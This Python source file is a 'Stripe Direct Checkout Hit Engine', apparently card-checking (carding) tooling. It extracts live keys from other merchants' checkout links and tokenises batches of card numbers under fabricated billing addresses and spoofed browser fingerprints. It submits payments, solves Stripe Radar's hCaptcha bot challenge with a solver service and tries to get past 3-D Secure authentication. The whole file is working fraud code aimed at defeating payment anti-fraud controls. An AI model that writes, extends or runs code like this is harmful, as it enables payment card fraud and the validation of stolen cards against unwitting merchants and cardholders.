# language: Python 3.10+, file: gateways/stripe/stripe_hit_engine.py
"""
Stripe Direct Checkout Hit Engine (stripe_hit_engine.py)
────────────────────────────────────────────────────────
High-performance direct checkout hit pipeline for Stripe cs_live links:
1. Fast #fid fragment decode (zero HTML scraping)
2. Dynamic invoice amount_mismatch auto-recalculation
3. Radar intent_confirmation_challenge detection + hCaptcha Enterprise solver
4. Frictionless 3DS2 resolution + ACS device fingerprinting
5. Multi-card session reuse pipeline (CsHitSession)
"""

import os
import re
import json
import time
import uuid
import random
import asyncio
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlparse

from curl_cffi.requests import AsyncSession
from gateways.stripe.stripe_fid import decode_fragment
from gateways.stripe.stripe_3ds_bypasser import Stripe3DSBypasser, GEO_TIMEZONES, SCREEN_RESOLUTIONS
import captcha_solver

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
DEFAULT_IMPERSONATE = "chrome131"

GEO_ADDRESSES = {
    "US": [
        {"line1": "100 Main St", "city": "New York", "state": "NY", "postal_code": "10001", "country": "US"},
        {"line1": "500 Market St", "city": "San Francisco", "state": "CA", "postal_code": "94105", "country": "US"},
        {"line1": "1200 Wilshire Blvd", "city": "Los Angeles", "state": "CA", "postal_code": "90017", "country": "US"},
        {"line1": "400 N Michigan Ave", "city": "Chicago", "state": "IL", "postal_code": "60611", "country": "US"},
    ],
    "GB": [
        {"line1": "10 Downing St", "city": "London", "state": "England", "postal_code": "SW1A 2AA", "country": "GB"},
        {"line1": "221B Baker St", "city": "London", "state": "England", "postal_code": "NW1 6XE", "country": "GB"},
    ],
    "CA": [
        {"line1": "100 King St W", "city": "Toronto", "state": "ON", "postal_code": "M5X 1A9", "country": "CA"},
    ]
}

def _amount_mismatch(status_code: int, err: dict) -> bool:
    if status_code not in (200, 400, 402, 409):
        return False
    src = " ".join(str(err.get(k) or "") for k in ("decline_code", "code", "message")).lower()
    return "amount_mismatch" in src or "expected amount" in src or "computed invoice" in src


class CsHitSession:
    """Single Stripe Checkout Session: #fid -> pk -> payment_pages; supports sequential card runs."""

    def __init__(self, target_url: str, proxy: str | None = None, max_amount_cents: int = 10000):
        self.url = target_url.strip()
        self.proxy = proxy
        self.max_amount = max_amount_cents
        self.s: Optional[AsyncSession] = None
        self.pk = ""
        self.cs = ""
        self.pi_id = ""
        self.secret = ""
        self.amount = 0
        self.currency = "USD"
        self.checksum = ""
        self.confirms = 0
        self.merchant_name = "Stripe Merchant"
        self.customer_email = ""
        self.customer_name = ""
        self.customer_country = "US"
        self.is_subscription = False

    async def open(self) -> Tuple[bool, str]:
        fid_data = decode_fragment(self.url)
        self.pk = str(fid_data.get("apiKey") or "")
        self.cs = str(fid_data.get("checkoutSessionId") or "")

        if not self.pk.startswith("pk_live") or not self.cs.startswith("cs_"):
            return False, "Could not extract valid pk_live and cs_live from #fid fragment (link expired?)"

        s = AsyncSession(impersonate=DEFAULT_IMPERSONATE, verify=False, proxy=self.proxy)
        try:
            r = await s.get(
                f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                params={"key": self.pk},
                headers={
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                    "Accept": "application/json"
                },
                timeout=12
            )
            if r.status_code != 200:
                await s.close()
                return False, f"payment_pages returned HTTP {r.status_code}: {r.text[:120]}"

            data = r.json() or {}
            if data.get("is_sandbox_merchant") or not data.get("livemode", True):
                await s.close()
                return False, "TEST_MODE: Checkout session is on a sandbox/test merchant"

            sess_status = data.get("status")
            if sess_status in ("complete", "expired"):
                await s.close()
                return False, f"Checkout session is already {sess_status}"

            acct = data.get("account_settings") or {}
            if isinstance(acct, dict) and acct.get("display_name"):
                self.merchant_name = acct["display_name"]
            elif data.get("statement_descriptor"):
                self.merchant_name = data["statement_descriptor"]

            pi = data.get("payment_intent") or {}
            self.secret = str(pi.get("client_secret") or "")
            self.pi_id = str(pi.get("id") or "")
            self.checksum = str(data.get("init_checksum") or "")

            # Prioritize total_summary due / invoice amount_due as that reflects
            # localized/adaptive presentation currency required by payment_pages confirm
            due = ((data.get("total_summary") or {}).get("due")) or ((data.get("invoice") or {}).get("amount_due"))
            if due:
                self.amount = int(due)
                self.currency = str(data.get("currency") or (data.get("invoice") or {}).get("currency") or pi.get("currency") or "USD").upper()
            else:
                self.amount = int(pi.get("amount") or 0)
                self.currency = str(pi.get("currency") or data.get("currency") or "USD").upper()

            cust = data.get("customer") or {}
            self.customer_email = str(data.get("customer_email") or cust.get("email") or "")
            self.customer_name = str(cust.get("name") or "")
            self.customer_country = str(
                (cust.get("address") or {}).get("country")
                or (data.get("tax_context") or {}).get("customer_tax_country")
                or "US"
            )

            status = pi.get("status")
            if status and status not in ("requires_payment_method", "requires_action"):
                await s.close()
                return False, f"PaymentIntent status={status} — session cannot be reused"

            self.is_subscription = bool(data.get("mode") == "subscription" or data.get("subscription_data"))

            if self.amount > self.max_amount:
                await s.close()
                return False, f"CHARGE_RISK: Amount {self.amount/100:.2f} {self.currency} exceeds safe cap of {self.max_amount/100:.2f}"

            self.s = s
            return True, ""
        except Exception as e:
            try: await s.close()
            except Exception: pass
            return False, f"{type(e).__name__}: {e}"

    async def _alive(self) -> bool:
        if not self.s:
            return False
        try:
            r = await self.s.get(
                f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                params={"key": self.pk},
                headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"},
                timeout=10
            )
            data = r.json() or {}
            if data.get("status") in ("complete", "expired"):
                return False
            pi = data.get("payment_intent") or {}
            st = pi.get("status")
            if st:
                return st in ("requires_payment_method", "requires_action")
            return data.get("status") == "open"
        except Exception:
            return False

    async def check_card(self, card_input: Any) -> Dict[str, Any]:
        t0 = time.time()
        if self.s is None:
            return {"success": False, "error": "Session not opened", "status": "ERROR", "response_time": 0}

        if self.confirms >= 10 or not await self._alive():
            return {"success": False, "error": "Confirm budget exhausted or session expired", "status": "SESSION_EXPIRED", "response_time": time.time() - t0}

        # Format Card
        if isinstance(card_input, dict):
            cc = str(card_input.get("card") or card_input.get("number") or "").strip()
            mm = str(card_input.get("month") or card_input.get("mm") or "01").zfill(2)
            yy = str(card_input.get("year") or card_input.get("yy") or "2030").strip()
            if len(yy) == 2: yy = "20" + yy
            cvv = str(card_input.get("cvv") or card_input.get("cvc") or "").strip()
        else:
            parts = re.split(r"[|:;/\s]+", str(card_input).strip())
            cc = parts[0] if len(parts) > 0 else ""
            mm = parts[1].zfill(2) if len(parts) > 1 else "01"
            yy = parts[2] if len(parts) > 2 else "2030"
            if len(yy) == 2: yy = "20" + yy
            cvv = parts[3] if len(parts) > 3 else ""

        card_dict = {"card": cc, "month": mm, "year": yy, "cvv": cvv}

        # 1. Tokenize Card (POST /v1/payment_methods)
        cc_country = (self.customer_country or "US").upper()
        tz_pool = GEO_TIMEZONES.get(cc_country, GEO_TIMEZONES["US"])
        tz_offset = str(random.choice(tz_pool))
        width, height = random.choice(SCREEN_RESOLUTIONS)

        addr_pool = GEO_ADDRESSES.get(cc_country, GEO_ADDRESSES["US"])
        addr = random.choice(addr_pool)

        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())

        tok_body = {
            "type": "card",
            "card[number]": cc,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv,
            "billing_details[address][line1]": addr["line1"],
            "billing_details[address][city]": addr["city"],
            "billing_details[address][state]": addr["state"],
            "billing_details[address][postal_code]": addr["postal_code"],
            "billing_details[address][country]": addr["country"],
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": self.pk,
            "payment_user_agent": "stripe.js/fe705f067f; stripe-js-v3/fe705f067f; checkout",
            "referrer": self.url.split("#")[0],
            "time_on_page": str(random.randint(15000, 35000)),
        }
        if self.customer_email:
            tok_body["billing_details[email]"] = self.customer_email
        if self.customer_name:
            tok_body["billing_details[name]"] = self.customer_name
        else:
            tok_body["billing_details[name]"] = "Alex Smith"

        tok_headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "User-Agent": UA,
            "Accept": "application/json",
        }

        try:
            r_tok = await self.s.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=tok_headers, timeout=12)
            td = r_tok.json() or {}
        except Exception as e:
            return {"success": False, "error": f"Tokenization error: {e}", "status": "ERROR", "card": card_dict, "response_time": time.time() - t0}

        pm_id = td.get("id")
        if not pm_id:
            err = td.get("error", {})
            code = err.get("decline_code") or err.get("code") or "tokenize_failed"
            msg = err.get("message", "Failed to tokenize card")
            return {"success": False, "error": msg, "decline_code": code, "status": "DECLINED", "card": card_dict, "response_time": time.time() - t0}

        # 2. Confirm Payment (POST /v1/payment_pages/{cs}/confirm)
        confirm_body = {
            "key": self.pk,
            "eid": str(uuid.uuid4()),
            "payment_method": pm_id,
            "expected_payment_method_type": "card",
            "expected_amount": str(self.amount),
            "return_url": self.url.split("#")[0],
            "client_attribution_metadata[client_session_id]": self.cs,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
        }
        if self.checksum:
            confirm_body["init_checksum"] = self.checksum

        try:
            r_conf = await self.s.post(
                f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                data=confirm_body,
                headers=tok_headers,
                timeout=20
            )
            resp = r_conf.json() or {}
        except Exception as e:
            return {"success": False, "error": f"Confirm error: {e}", "status": "ERROR", "card": card_dict, "response_time": time.time() - t0}

        self.confirms += 1

        # 3. Dynamic Amount Mismatch Auto-Recovery
        err = resp.get("error") or {}
        if _amount_mismatch(getattr(r_conf, "status_code", 0), err):
            try:
                err_msg = str(err.get("message") or "")
                m = re.search(r'(?:actual|expected) amount \((\d+)\)', err_msg.lower())
                exact_amt = int(m.group(1)) if m else None

                rg = await self.s.get(
                    f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                    params={"key": self.pk},
                    headers=tok_headers,
                    timeout=10
                )
                data0 = rg.json() or {}
                pi0 = data0.get("payment_intent") or {}
                tot0 = (data0.get("total_summary") or {}).get("due") or (data0.get("invoice") or {}).get("amount_due")
                new_amt = exact_amt or tot0 or pi0.get("amount")
                if data0.get("currency"):
                    self.currency = str(data0.get("currency")).upper()
                if new_amt and int(new_amt) != self.amount:
                    self.amount = int(new_amt)
                    confirm_body["expected_amount"] = str(self.amount)
                    confirm_body["eid"] = str(uuid.uuid4())
                    r_conf2 = await self.s.post(
                        f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                        data=confirm_body,
                        headers=tok_headers,
                        timeout=20
                    )
                    resp = r_conf2.json() or {}
                    self.confirms += 1
            except Exception:
                pass

        # 4. Classify & Resolve
        return await self._handle_outcome(resp, card_dict, t0)

    async def _handle_outcome(self, resp: dict, card_dict: dict, t0: float) -> Dict[str, Any]:
        result = {
            "success": False,
            "card": card_dict,
            "amount": f"{self.currency} {self.amount/100:.2f}",
            "raw_amount": self.amount,
            "merchant": self.merchant_name,
            "decline_code": None,
            "error": None,
            "status": "UNKNOWN",
            "3ds_bypassed": False,
            "captcha_bypassed": False,
            "raw_response": resp,
            "response_time": time.time() - t0,
        }

        err = resp.get("error") or {}
        if err:
            result["decline_code"] = err.get("decline_code") or err.get("code") or "declined"
            result["error"] = err.get("message", "Card declined")
            result["status"] = "DECLINED"
            return result

        if resp.get("status") == "complete" or resp.get("payment_status") == "paid":
            result["success"] = True
            result["status"] = "APPROVED@PAID"
            return result

        pi = resp.get("payment_intent") or resp.get("setup_intent") or {}
        pi_status = str(pi.get("status") or "")
        lpe = pi.get("last_payment_error") or {}

        if pi_status == "succeeded":
            result["success"] = True
            result["status"] = "APPROVED@PAID"
            return result

        if lpe:
            result["decline_code"] = lpe.get("decline_code") or lpe.get("code") or "declined"
            result["error"] = lpe.get("message", "Card declined")
            result["status"] = "DECLINED"
            return result

        if pi_status == "requires_action":
            next_action = pi.get("next_action") or {}
            na_type = next_action.get("type") or ""

            if na_type == "use_stripe_sdk":
                sdk = next_action.get("use_stripe_sdk") or {}
                sdk_type = sdk.get("type") or ""
                stripe_js = sdk.get("stripe_js") or {}

                # ── Radar Bot Detection (intent_confirmation_challenge) ──
                if sdk_type == "intent_confirmation_challenge":
                    site_key = str(sdk.get("site_key") or stripe_js.get("site_key") or "")
                    rqdata = stripe_js.get("rqdata")
                    v_url = stripe_js.get("verification_url") or f"/v1/payment_intents/{pi.get('id')}/verify_challenge"

                    # Attempt solver if key is configured
                    if captcha_solver.has_any_solver_key() and site_key:
                        try:
                            token = await captcha_solver.solve_hcaptcha_enterprise(
                                sitekey=site_key,
                                pageurl="https://checkout.stripe.com",
                                rqdata=rqdata
                            )
                            if token:
                                v_full = f"https://api.stripe.com{v_url}" if v_url.startswith("/") else v_url
                                verify_body = {
                                    "key": self.pk,
                                    "client_secret": pi.get("client_secret", ""),
                                    "captcha_response": token
                                }
                                rv = await self.s.post(v_full, data=verify_body, headers={"User-Agent": UA}, timeout=15)
                                rv_json = rv.json() or {}
                                rv_pi = rv_json.get("payment_intent") or rv_json
                                if rv_pi.get("status") in ("succeeded", "complete"):
                                    result["success"] = True
                                    result["status"] = "APPROVED@PAID"
                                    result["captcha_bypassed"] = True
                                    return result
                                elif rv_pi.get("status") == "requires_payment_method":
                                    lpe = rv_pi.get("last_payment_error") or {}
                                    result["status"] = "DECLINED"
                                    result["decline_code"] = lpe.get("decline_code") or "generic_decline"
                                    result["error"] = lpe.get("message", "Card declined")
                                    result["captcha_bypassed"] = True
                                    return result
                                elif rv_pi.get("status") in ("requires_action", "requires_source_action"):
                                    result["captcha_bypassed"] = True
                                    bypasser_res = await Stripe3DSBypasser.resolve_3ds(
                                        result={"raw_response": rv_json, "pk_key": self.pk},
                                        profile={"user_agent": UA, "country_code": self.customer_country}
                                    )
                                    if bypasser_res.get("success"):
                                        result["success"] = True
                                        result["status"] = "APPROVED@PAID"
                                        result["3ds_bypassed"] = True
                                        return result
                                    elif bypasser_res.get("decline_code"):
                                        result["status"] = "DECLINED"
                                        result["decline_code"] = bypasser_res.get("decline_code")
                                        result["error"] = bypasser_res.get("error", "Declined")
                                        return result
                        except Exception as _ex:
                            print(f"[DEBUG HIT ENGINE] verify challenge error: {_ex}")

                    # Unsolved Radar challenge
                    result["status"] = "CAPTCHA_CHECKOUT"
                    result["decline_code"] = "radar_bot_challenge"
                    result["error"] = "Stripe Radar Bot Challenge (hCaptcha Enterprise triggered by Stripe WAF)"
                    return result

                # ── Real 3DS Resolution ──
                if self.s:
                    bypasser_res = await Stripe3DSBypasser.resolve_3ds(
                        result={"raw_response": resp, "pk_key": self.pk},
                        profile={"user_agent": UA, "country_code": self.customer_country}
                    )
                    if bypasser_res.get("success"):
                        result["success"] = True
                        result["status"] = "3DS_FRICTIONLESS_PASSED"
                        result["3ds_bypassed"] = True
                        return result
                    elif bypasser_res.get("3ds_attempted"):
                        result["status"] = "3DS_CHALLENGE"
                        result["decline_code"] = "authentication_required"
                        result["error"] = "Issuer requires 3DS OTP/SMS Challenge"
                        return result

            result["status"] = "3DS_REQUIRED"
            result["decline_code"] = "authentication_required"
            result["error"] = "3DS Authentication required"
            return result

        result["status"] = "DECLINED"
        return result

    async def close(self):
        if self.s is not None:
            try: await self.s.close()
            except Exception: pass
            self.s = None